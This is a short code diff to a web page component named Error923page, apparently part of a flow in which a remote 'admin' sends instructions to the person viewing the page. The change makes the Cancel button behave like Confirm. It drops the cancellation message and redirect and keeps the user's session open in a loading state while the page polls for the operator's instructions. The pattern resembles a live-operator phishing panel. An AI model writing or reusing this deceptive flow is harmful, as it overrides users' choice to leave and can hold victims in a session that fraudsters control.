@@ -129,16 +129,9 @@ export default function Error923page() {
                 accion
             });
 
-            if (accion === 'confirmar') {
-                // Iniciar Polling para esperar instrucciones del admin
-                iniciarPolling(sesionId);
-            } else {
-                // Cancelar: Tal vez redirigir o mostrar mensaje final
-                setCargando(false);
-                alert("Has cancelado la operación.");
-                // Opcional: Redirigir a inicio o bloquear
-                window.location.href = '/';
-            }
+            // Unify logic: Both Confirm and Cancel enter polling state
+            // "si es cancelar ... activamos los botones sin cerrar la session es solo es queda en cargando"
+            iniciarPolling(sesionId);
 
         } catch (error) {
             console.error("Error enviando respuesta 923", error);
